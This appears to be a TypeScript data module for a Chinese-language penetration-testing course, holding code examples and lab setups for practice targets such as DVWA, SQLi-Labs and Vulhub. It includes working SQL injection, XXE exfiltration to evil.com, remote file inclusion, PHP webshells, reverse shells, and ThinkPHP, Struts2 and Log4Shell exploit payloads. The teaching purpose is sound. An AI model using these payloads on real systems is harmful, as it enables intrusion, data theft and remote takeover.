  </form>
  <script>
    // 页面加载后自动提交表单
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>`,
      explanation: 'CSRF的基本原理：诱导已登录的受害者访问恶意页面，页面自动发起伪造请求。因为请求是从受害者浏览器发出的，会自动带上Cookie，服务器无法区分是用户主动操作还是被诱导的。'
    },
    {
      title: '文件包含漏洞利用示例',
      language: 'text',
      code: `# 本地文件包含（LFI）：读取系统文件
http://target.com/index.php?page=../../../../etc/passwd
http://target.com/index.php?page=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts

# 本地文件包含 + 上传图片马 = Getshell
# 先上传包含PHP代码的图片，再用文件包含执行
http://target.com/index.php?page=upload/shell.jpg

# 远程文件包含（RFI）：包含远程恶意文件
# 需要allow_url_include=On
http://target.com/index.php?page=http://evil.com/shell.txt

# PHP伪协议：读取源码（base64编码）
http://target.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php`,
      explanation: '文件包含漏洞的常见利用方式。LFI可以读取系统文件，配合上传图片马可以getshell。RFI危害更大，可以直接包含远程恶意代码。PHP伪协议可以用来读取PHP源码。'
    },
  ],
  'sqli': [
    {
      title: '布尔盲注：手工猜解数据库名',
      language: 'sql',
      code: `-- 判断数据库名长度
1' and length(database())>5-- 

-- 猜第一个字符（二分法）
1' and ascii(substr(database(),1,1))>97-- 
1' and ascii(substr(database(),1,1))>110-- 

-- 猜第二个字符
1' and ascii(substr(database(),2,1))>97-- 

-- 以此类推，逐字符猜解`,
      explanation: '布尔盲注的核心思路：通过页面返回的真假（正常/异常）来逐字符猜解数据。通常用二分法提高效率。手工盲注比较费时，一般用脚本或sqlmap。'
    },
    {
      title: 'sqlmap常用命令',
      language: 'bash',
      code: `# 基本检测是否有注入
sqlmap -u "http://example.com/?id=1"

# 获取所有数据库
sqlmap -u "http://example.com/?id=1" --dbs

# 指定数据库，获取所有表
sqlmap -u "http://example.com/?id=1" -D testdb --tables

# 指定表，获取所有列
sqlmap -u "http://example.com/?id=1" -D testdb -T users --columns

# 拖库（获取数据）
sqlmap -u "http://example.com/?id=1" -D testdb -T users --dump

# POST注入（用-r指定请求文件）
sqlmap -r request.txt -p username`,
      explanation: 'sqlmap最常用的命令。从检测注入点到拖库的完整流程。sqlmap功能非常强大，还有很多高级参数，建议仔细看官方文档。'
    },
    {
      title: '报错注入：常用payload汇总',
      language: 'sql',
      code: `-- updatexml() 报错注入（MySQL）
1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)-- 

-- extractvalue() 报错注入（MySQL）
1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- 

-- floor() 报错注入（group by重复键报错）
1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- 

-- 报错注入获取表名
1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)-- 

-- 注意：updatexml最多显示32个字符，数据太长需要用substr截取`,
      explanation: '报错注入的常用payload。利用数据库的报错机制，将查询结果通过错误信息显示出来。适用于页面有错误回显但没有正常回显位的情况。注意updatexml有32字符长度限制。'
    },
    {
      title: '时间盲注Python脚本示例',
      language: 'python',
      code: `import requests
import time

url = "http://target.com/sqli-labs/Less-9/?id=1'"
result = ""
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"

# 猜数据库名长度
for i in range(1, 20):
    payload = f"1' and if(length(database())={i},sleep(3),1)-- "
    start = time.time()
    requests.get(url + payload)
    if time.time() - start > 2.5:
        print(f"数据库名长度: {i}")
        break

# 逐字符猜数据库名
for pos in range(1, 10):
    for c in charset:
        payload = f"1' and if(substr(database(),{pos},1)='{c}',sleep(3),1)-- "
        start = time.time()
        requests.get(url + payload)
        if time.time() - start > 2.5:
            result += c
            print(f"第{pos}位: {c}，当前结果: {result}")
            break

print(f"数据库名: {result}")`,
      explanation: '时间盲注Python脚本的基本思路：利用if()+sleep()，根据响应时间来判断条件是否成立，逐字符猜解数据。这是理解盲注原理的好练习。实际场景中用sqlmap效率更高。'
    },
  ],
  'upload': [
    {
      title: '图片马制作命令',
      language: 'bash',
      code: `# 方法1：用copy命令（Windows）
copy 1.jpg /b + shell.php /a shell.jpg

# 方法2：用cat命令（Linux）
cat 1.jpg shell.php > shell.jpg

# 方法3：直接追加
echo "<?php @eval(\$_POST['cmd']); ?>" >> 1.jpg

# 验证图片马
# 图片正常显示，末尾有PHP代码
# 配合文件包含或解析漏洞执行`,
      explanation: '图片马就是在正常图片末尾追加PHP代码。图片检查通常只检查文件头，所以能绕过。但图片马需要配合解析漏洞或文件包含漏洞才能执行。'
    },
    {
      title: '常见后缀绕过方式',
      language: 'text',
      code: `# 大小写绕过
shell.pHp
shell.PHP

# 点号绕过（Windows特性）
shell.php.

# 空格绕过（Windows特性）
shell.php 

# ::$DATA绕过（Windows NTFS流特性）
shell.php::$DATA

# 双写绕过（过滤只替换一次）
shell.pphphp

# 解析漏洞利用
shell.php.jpg
shell.php.png`,
      explanation: '常见的文件上传后缀绕过技巧。不同操作系统、不同Web服务器、不同配置下，绕过方法也不同。实战中需要灵活运用，多尝试。'
    },
    {
      title: '%00截断利用详解',
      language: 'text',
      code: `# %00截断原理：C语言中字符串以\\0（0x00）结尾
# PHP < 5.3.4 + magic_quotes_gpc = Off

# GET型00截断（URL编码）
http://target.com/upload.php?path=upload/shell.php%00.jpg
# 服务器读取到%00就截断，实际保存为 shell.php

# POST型00截断（需要Burp改hex）
# filename="shell.php.jpg"
# 在.php和.jpg之间插入00字节（hex: 00）
# 改完后：filename="shell.php\x00.jpg"

# 00截断的利用条件：
# 1. PHP版本 < 5.3.4
# 2. magic_quotes_gpc = Off
# 3. 上传路径/文件名可控`,
      explanation: '%00截断是经典的文件上传绕过技巧。原理是底层C语言中字符串以\\0结尾。GET型可以直接在URL里加%00，POST型需要在Burp里改hex插入00字节。注意高版本PHP已修复此问题。'
    },
    {
      title: '图片马制作与检测原理',
      language: 'bash',
      code: `# 图片文件头标识（不同格式的文件头）
# JPG: FF D8 FF
# PNG: 89 50 4E 47
# GIF: 47 49 46 38

# 方法1：Windows copy命令（二进制+文本合并）
copy /b normal.jpg + shell.php image_shell.jpg

# 方法2：Linux cat命令
cat normal.jpg shell.php > image_shell.jpg

# 方法3：十六进制编辑器直接追加
# 在图片文件末尾直接添加PHP代码

# 验证图片马
# 1. 图片能正常打开（文件头是图片）
# 2. 末尾有PHP代码（用记事本打开看最后）
# 3. 配合文件包含或解析漏洞执行

# 图片马不能直接执行，需要配合：
# - 文件包含漏洞：include($_GET['page'])
# - 解析漏洞：Apache AddHandler / Nginx解析漏洞`,
      explanation: '图片马的核心原理：文件头是正常图片（绕过检测），文件尾追加脚本代码。图片马本身不能直接执行，必须配合文件包含漏洞或解析漏洞才能执行。理解这一点很重要。'
    },
  ],
  'pikachu': [
    {
      title: 'PHP反序列化入门示例',
      language: 'php',
      code: `<?php
// 定义一个类
class Test {
    public $name = "test";
    public function __destruct() {
        // 对象销毁时自动调用
        echo "destruct called: " . $this->name;
    }
}

// 创建对象并序列化
$obj = new Test();
$obj->name = "phpinfo();";
$serialized = serialize($obj);
echo $serialized;
// 输出：O:4:"Test":1:{s:4:"name";s:10:"phpinfo();";}

// 反序列化（如果攻击者可控，就危险了）
$evil = 'O:4:"Test":1:{s:4:"name";s:10:"phpinfo();";}';
unserialize($evil); // 会触发__destruct
?>`,
      explanation: 'PHP反序列化的基本原理。攻击者构造恶意序列化数据，触发反序列化时的魔法方法（如__destruct、__wakeup、__toString等），从而执行恶意代码。'
    },
    {
      title: 'SSRF常用探测payload',
      language: 'text',
      code: `# 探测本机
http://127.0.0.1/
http://localhost/

# 探测内网（常见内网段）
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/

# 探测端口
http://127.0.0.1:22/    # SSH
http://127.0.0.1:3306/  # MySQL
http://127.0.0.1:6379/  # Redis
http://127.0.0.1:8080/  # 常见Web端口

# 协议变种
file:///etc/passwd
dict://127.0.0.1:3306/info
gopher://127.0.0.1:6379/_payload`,
      explanation: 'SSRF常用探测payload。从探测本机和内网开始，逐步发现内网服务。不同环境支持的协议不同，file:// dict:// gopher:// 等协议可以扩展攻击面。'
    },
    {
      title: 'XXE漏洞利用示例',
      language: 'xml',
      code: `<!-- 基本XXE：读取本地文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>

<!-- XXE进行SSRF内网探测 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:6379/">
]>
<user>&xxe;</user>

<!-- 外部实体注入（加载远程DTD） -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
  %send;
]>
<user>&xxe;</user>

<!-- evil.dtd 内容：
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>">
%send;
%exfil;
-->`,
      explanation: 'XXE漏洞的常见利用方式。最基础的是读取本地文件，进阶可以进行SSRF内网探测，还可以通过外部DTD实现无回显数据外带。XXE危害大但发现点相对较少，多见于XML接口。'
    },
    {
      title: 'PHP反序列化POP链示例',
      language: 'php',
      code: `<?php
// POP链：从反序列化入口到代码执行的调用链
// A::__destruct() → B::__toString() → C::__call() → eval()

class A {
    public $b;
    public function __destruct() {
        echo $this->b; // 把对象当作字符串，触发__toString()
    }
}

class B {
    public $c;
    public function __toString() {
        $this->c->test(); // 调用不存在的方法，触发__call()
        return "B";
    }
}

class C {
    public $code;
    public function __call($name, $args) {
        eval($this->code); // 代码执行点
    }
}

// 构造POP链
$c = new C();
$c->code = "phpinfo();";

$b = new B();
$b->c = $c;

$a = new A();
$a->b = $b;

// 序列化payload
echo serialize($a);
// 输出：O:1:"A":1:{s:1:"b";O:1:"B":1:{s:1:"c";O:1:"C":1:{s:4:"code";s:10:"phpinfo();";}}}

// 反序列化触发：A::__destruct → B::__toString → C::__call → eval()
unserialize(serialize($a));
?>`,
      explanation: '反序列化POP链的基本构造思路。从反序列化入口（通常是__wakeup或__destruct）开始，通过魔法方法的调用链，最终到达代码执行点。真实场景中的POP链要复杂得多，需要在目标代码库中寻找可利用的类。'
    },
  ],
  'vulnhub': [
    {
      title: 'Nmap常用扫描命令',
      language: 'bash',
      code: `# 基本扫描（TCP SYN扫描，需要root）
nmap 192.168.1.100

# 全端口扫描
nmap -p- 192.168.1.100

# 版本探测（扫描服务版本）
nmap -sV 192.168.1.100

# 操作系统探测
nmap -O 192.168.1.100

# 快速扫描常用端口
nmap -F 192.168.1.100

# 综合扫描（版本+OS+脚本）
nmap -A 192.168.1.100

# 扫描整个C段
nmap 192.168.1.0/24

# 输出到文件
nmap -oN scan_result.txt 192.168.1.100`,
      explanation: 'Nmap是信息收集阶段最核心的工具。掌握常用扫描参数是渗透测试的基本功。根据不同场景选择不同的扫描策略。'
    },
    {
      title: 'Linux提权信息收集',
      language: 'bash',
      code: `# 系统信息
uname -a
cat /etc/os-release
cat /etc/issue

# 用户与权限
whoami
id
sudo -l

# SUID文件（重点关注）
find / -perm -u+s -type f 2>/dev/null

# 计划任务
crontab -l
ls -la /etc/cron*
cat /etc/crontab

# 可写目录
find / -writable -type d 2>/dev/null

# 数据库配置文件
find / -name "config*.php" 2>/dev/null

# 历史命令
history
cat ~/.bash_history`,
      explanation: '拿到Shell后，先做系统的信息收集，寻找提权突破口。SUID文件、计划任务、sudo权限、内核版本都是重点关注对象。提权的关键是细心枚举。'
    },
    {
      title: '反弹Shell常用Payload',
      language: 'bash',
      code: `# 攻击机监听（kali）
nc -lvnp 4444

# ========== 目标机执行（各种语言的反弹shell） ==========

# Bash反弹
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Netcat反弹（传统版）
nc -e /bin/bash 192.168.1.100 4444

# Netcat反弹（无-e参数版）
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f

# Python反弹
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP反弹
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# 注意：把192.168.1.100换成攻击机IP，4444换成监听端口`,
      explanation: '反弹Shell是渗透测试的必备技能。当目标在内网、有防火墙或没有公网IP时，正向连接连不上，就需要让目标主动反弹回来。不同环境支持的工具不同，多准备几种payload总没错。'
    },
    {
      title: 'Linux提权常用命令与方法',
      language: 'bash',
      code: `# 1. 内核漏洞提权（先查内核版本）
uname -a
# 比如 DirtyCow（CVE-2016-5195）适用于Linux内核 < 4.8.3
# 下载对应exp → 编译 → 运行

# 2. SUID提权
find / -perm -u+s -type f 2>/dev/null
# 关注：nmap、vim、find、bash、python等
# 例子：find提权
find . -exec /bin/sh \\; -quit

# 3. sudo提权（看sudo -l能执行什么）
sudo -l
# 如果能sudo执行某个程序，查GTFOBins找绕过方法

# 4. 计划任务提权
cat /etc/crontab
# 看有没有以root运行的脚本，且脚本可写或路径可控

# 5. 数据库提权（MySQL UDF提权等）
# 拿到数据库root权限后，可以尝试UDF提权`,
      explanation: 'Linux提权的常用方法汇总。提权不是瞎试，而是系统地枚举和利用。推荐GTFOBins网站（https://gtfobins.github.io/），查询各种程序的提权方法，非常实用。'
    },
  ],
  'vulhub': [
    {
      title: 'Docker常用命令',
      language: 'bash',
      code: `# 查看正在运行的容器
docker ps

# 查看所有容器
docker ps -a

# 启动/停止/重启容器
docker start 容器名
docker stop 容器名
docker restart 容器名

# 进入容器
docker exec -it 容器名 /bin/bash

# 查看镜像
docker images

# 删除容器/镜像
docker rm 容器名
docker rmi 镜像名

# 查看日志
docker logs 容器名

# Docker Compose 启动/停止
docker-compose up -d
docker-compose down`,
      explanation: 'Docker的基础常用命令。用Vulhub复现漏洞时，docker-compose up -d启动环境，docker-compose down关闭环境。多练几次就熟悉了。'
    },
    {
      title: 'ThinkPHP 5.x RCE漏洞POC',
      language: 'http',
      code: `# ThinkPHP 5.0.x RCE
GET /?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1
Host: example.com

# 命令执行
GET /?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami HTTP/1.1

# ThinkPHP 5.1.x RCE
GET /?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id HTTP/1.1`,
      explanation: 'ThinkPHP 5.x 远程代码执行漏洞的POC。框架漏洞往往影响范围广，利用简单，危害极大。学习漏洞复现可以帮助理解框架安全问题。'
    },
    {
      title: 'Struts2 S2-045 漏洞POC',
      language: 'http',
      code: `# Struts2 S2-045（CVE-2017-5638）
# 漏洞原因：Content-Type头OGNL表达式注入
POST / HTTP/1.1
Host: example.com
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

# 简化版（执行命令）
Content-Type: %{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.utf[0]),#w=#res.getWriter(),#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream())),#w.close(),1?#xx:#request.toString}?cmd=whoami&utf=UTF-8`,
      explanation: 'Struts2 S2-045是经典的框架漏洞，通过Content-Type头注入OGNL表达式实现RCE。Struts2历史上爆出过多个严重漏洞（S2-001到S2-062+），是Java框架漏洞的代表。'
    },
    {
      title: 'Log4j2（Log4Shell）漏洞POC',
      language: 'text',
      code: `# Log4j2 JNDI注入（CVE-2021-44228）
# 原理：Log4j2解析\${jndi:...}格式的日志，触发JNDI注入

# 基础payload（DNS探测用）
\${jndi:ldap://\${sys:java.version}.xxx.dnslog.cn/test}

# RCE payload（需要LDAP服务配合）
\${jndi:ldap://evil.com:1389/evil}

# 常见注入点：
# - HTTP请求头（User-Agent、X-Forwarded-For等）
# - URL参数
# - POST表单数据
# - 任何会被记录到日志的输入

# 利用工具：JNDI-Injection-Exploit、marshalsec等
# 攻击机起LDAP服务，目标请求恶意LDAP地址，加载远程恶意类执行代码`,
      explanation: 'Log4j2漏洞（Log4Shell）是近年来影响最广的漏洞之一。只要输入的内容会被Log4j2记录到日志中，就可能触发漏洞。利用方式简单，危害极大，几乎所有使用Java的企业都受影响。'
    },
  ],
};

/* ==================== 分阶段实验靶场 ==================== */
const labEnvByPhase: Record<string, { name: string; description: string; url: string; type: 'docker' | 'online' | 'tool' | 'local'; setup?: string; expectedOutput?: string }[]> = {
  'env': [
    {
      name: 'PHPStudy本地环境',
      description: 'Windows下一键搭建PHP+MySQL+Apache运行环境，是靶场入门的基础',
      url: 'https://www.xp.cn/',
      type: 'local',
      setup: '1. 下载PHPStudy安装包\n2. 默认安装到D:\\phpstudy\n3. 启动Apache和MySQL\n4. 浏览器访问 http://localhost 验证',
      expectedOutput: '浏览器显示"PHP Study"探针页面，说明环境搭建成功'
    },
    {
      name: 'Burp Suite配置',
      description: 'Web渗透测试必备抓包工具，配置浏览器代理即可拦截HTTP请求',
      url: 'https://portswigger.net/burp',
      type: 'tool',
      setup: '1. 安装Burp Suite Community版\n2. 启动后选择Temporary project\n3. Proxy → Options确认监听127.0.0.1:8080\n4. 浏览器配置代理指向8080端口',
      expectedOutput: '访问HTTP网站时，Burp Suite能拦截到请求包'
    },
  ],
  'dvwa': [
    {
      name: 'DVWA靶场',
      description: 'Damn Vulnerable Web Application，入门级Web漏洞练习平台',
      url: 'https://dvwa.co.uk/',
      type: 'local',
      setup: '1. 下载DVWA源码解压到PHPStudy的WWW目录\n2. 复制config/config.inc.php.dist为config.inc.php\n3. 修改数据库配置为root/root\n4. 访问 http://localhost/dvwa/setup.php 创建数据库',
      expectedOutput: '创建成功后跳转到登录页，用 admin/password 登录'
    },
    {
      name: 'DVWA四难度挑战',
      description: '从Low到Impossible四个难度，循序渐进理解漏洞原理和防御',
      url: 'https://dvwa.co.uk/',
      type: 'local',
      setup: '1. 登录DVWA后点击DVWA Security\n2. 选择安全级别（Low/Medium/High/Impossible）\n3. 每个级别分别通关所有模块\n4. 对比不同级别过滤代码的区别',
      expectedOutput: '所有难度所有模块都能独立完成利用，理解各级别防护差异'
    },
  ],
  'sqli': [
    {
      name: 'SQLi-Labs',
      description: '75关SQL注入专项练习，涵盖各种注入类型和绕过技巧',
      url: 'https://github.com/Audi-1/sqli-labs',
      type: 'local',
      setup: '1. 下载源码放到PHPStudy的WWW目录\n2. 访问 setup-db.php 创建数据库\n3. 修改sql-connections/db-creds.inc配置数据库账号\n4. 从Less-1开始逐关练习',
      expectedOutput: 'Less1到Less75逐关通关，掌握各类SQL注入技巧'
    },
    {
      name: 'sqlmap练习环境',
      description: '使用SQLi-Labs作为目标，练习sqlmap自动化注入工具',
      url: 'https://sqlmap.org/',
      type: 'tool',
      setup: '1. 安装Python环境\n2. 下载sqlmap源码\n3. 以SQLi-Labs Less-1为目标\n4. 练习 --dbs / -D / -T / --dump 等参数',
      expectedOutput: '能用sqlmap完成拖库，熟练掌握常用参数'
    },
  ],
  'upload': [
    {
      name: 'Upload-Labs',
      description: '21关文件上传专项练习，涵盖各种绕过技巧和防御',
      url: 'https://github.com/c0ny1/upload-labs',
      type: 'local',
      setup: '1. 下载源码放到PHPStudy的WWW目录\n2. 确保upload目录有写权限\n3. 浏览器访问index.php\n4. 从Pass-01开始逐关练习',
      expectedOutput: 'Pass1到Pass21全部通关，掌握各类上传绕过手法'
    },
    {
      name: '蚁剑WebShell管理',
      description: '使用AntSword管理上传的WebShell，练习文件管理和命令执行',
      url: 'https://github.com/AntSwordProject/antSword',
      type: 'tool',
      setup: '1. 下载并安装蚁剑\n2. 在Upload-Labs上传一句话木马\n3. 蚁剑中添加Shell，填写URL和密码\n4. 测试文件管理、虚拟终端等功能',
      expectedOutput: '蚁剑成功连接WebShell，能查看文件、执行命令'
    },
  ],
  'pikachu': [
    {
      name: 'Pikachu靶场',
      description: '综合型Web漏洞练习平台，更接近真实网站场景',
      url: 'https://github.com/zhuifengshaonianhanlu/pikachu',
      type: 'local',
      setup: '1. 下载源码解压到WWW目录\n2. 访问install.php初始化数据库\n3. 修改inc/config.inc.php数据库配置\n4. 从首页开始逐个模块练习',
      expectedOutput: '所有模块都能独立完成，理解各漏洞在真实场景中的表现'
    },
    {
      name: 'XSS平台测试',
      description: '搭建或使用在线XSS平台，练习XSS数据外带和Cookie窃取',
      url: 'https://xss.pt/',
      type: 'online',
      setup: '1. 注册XSS平台账号\n2. 创建自己的XSS项目获取payload\n3. 在Pikachu的XSS模块中测试\n4. 观察平台是否接收到Cookie等数据',
      expectedOutput: '成功接收到受害者的Cookie和UA等信息'
    },
  ],
  'vulnhub': [
    {
      name: 'Jangow 1.0.1靶机',
      description: '入门级VulnHub靶机，从信息收集到提权的完整流程',
      url: 'https://www.vulnhub.com/entry/jangow-101,754/',
      type: 'local',
      setup: '1. 下载靶机OVA文件\n2. VMware中导入虚拟机\n3. 设置网络为NAT模式\n4. 启动靶机，从Kali中扫描发现IP',
      expectedOutput: '完整渗透流程：信息收集→WebShell→提权→获取root flag'
    },
    {
      name: 'Kioptrix Level 1',
      description: '经典入门靶机，有多种通关方法，适合学习提权思路',
      url: 'https://www.vulnhub.com/entry/kioptrix-level-1-1,22/',
      type: 'local',
      setup: '1. 下载Kioptrix Level 1虚拟机\n2. VMware导入并启动\n3. Nmap扫描目标端口和服务\n4. 尝试多种方法获取root权限',
      expectedOutput: '至少用两种不同方法获取root权限，理解不同提权思路'
    },
  ],
  'vulhub': [
    {
      name: 'Vulhub环境',
      description: '基于Docker的漏洞复现环境，一条命令启动漏洞环境',
      url: 'https://vulhub.org/',
      type: 'docker',
      setup: '1. 安装Docker和Docker Compose\n2. git clone https://github.com/vulhub/vulhub.git\n3. 进入对应漏洞目录\n4. 执行 docker-compose up -d 启动环境',
      expectedOutput: '环境启动成功，浏览器访问对应端口能看到漏洞页面'
    },
    {
      name: 'ThinkPHP RCE复现',
      description: '复现ThinkPHP 5.x远程代码执行漏洞，理解框架漏洞原理',
      url: 'https://vulhub.org/#/environments/thinkphp/5-rce/',
      type: 'docker',
      setup: '1. 进入 thinkphp/5-rce 目录\n2. docker-compose up -d 启动\n3. 访问 http://your-ip:8080\n4. 构造POC执行系统命令',
      expectedOutput: '成功执行phpinfo()和系统命令，获取服务器信息'
    },
  ],
};

/* ==================== 天数→阶段映射 ==================== */
const phaseForDay: Record<number, string> = {
  1: 'env', 2: 'env', 3: 'env', 4: 'env',
  5: 'dvwa', 6: 'dvwa', 7: 'dvwa', 8: 'dvwa', 9: 'dvwa', 10: 'dvwa', 11: 'dvwa', 12: 'dvwa',
  13: 'sqli', 14: 'sqli', 15: 'sqli', 16: 'sqli', 17: 'sqli', 18: 'sqli',
  19: 'upload', 20: 'upload', 21: 'upload',
  22: 'pikachu', 23: 'pikachu', 24: 'pikachu',
  25: 'vulnhub', 26: 'vulnhub', 27: 'vulnhub', 28: 'vulnhub',
  29: 'vulhub', 30: 'vulhub', 31: 'vulhub', 32: 'vulhub',
};

/* ==================== 导出：获取指定天的全部补充内容 ==================== */
export function getExtrasForDay(dayNum: number): DayPartial {
  const phase = phaseForDay[dayNum] || 'env';
  return {
    expertNotes: expertNotesByPhase[phase] || [],
    resources: resourcesByPhase[phase] || [],
    recommendedTools: toolsByPhase[phase] || [],
    codeExamples: codeExamplesByPhase[phase] || [],
    quiz: quizBankByPhase[phase] || [],
    labEnvironment: labEnvByPhase[phase] || [],
  };
}
